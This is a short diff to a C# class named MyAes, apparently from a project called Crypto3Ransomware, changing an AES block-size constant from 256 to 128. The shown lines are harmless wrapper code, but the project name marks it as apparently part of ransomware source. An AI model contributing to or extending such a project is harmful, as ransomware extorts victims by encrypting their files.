@@ -4,7 +4,7 @@ namespace Crypto3Ransomware;
 
 public class MyAes
 {
-    private const int BlocSize = 256;
+    private const int BlocSize = 128;
     public readonly Aes Aes;
 
     public MyAes()
